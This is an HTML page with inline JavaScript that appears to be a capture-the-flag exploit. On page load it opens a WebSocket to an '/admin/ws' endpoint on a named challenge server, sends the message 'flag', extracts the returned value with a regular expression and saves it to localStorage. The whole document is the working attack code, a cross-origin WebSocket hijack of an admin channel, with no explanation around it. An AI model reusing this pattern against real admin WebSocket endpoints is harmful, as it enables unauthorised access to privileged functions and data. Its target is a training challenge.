
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retrieve Flag</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws'); // Replace <server-address> with the actual server address

            ws.onopen = () => {
                console.log('WebSocket connection opened.');
                ws.send('flag'); // Request the flag
            };

            ws.onmessage = (event) => {
                console.log('Message from server:', event.data);

                // Extract the flag, assuming the flag is sent in the format "{hi}"
                const match = event.data.match(/\{(.+?)\}/);
                if (match) {
                    const flag = match[1]; // Extract the content inside the curly braces
                    localStorage.setItem('flag', flag); // Store the flag in localStorage
                    console.log('Flag stored:', flag);
                }
                ws.close();
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed.');
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
        });
    </script>
</head>
<body>
    <h1>Retrieve and Store Flag</h1>
    <p>The flag will be stored automatically.</p>
</body>
</html>
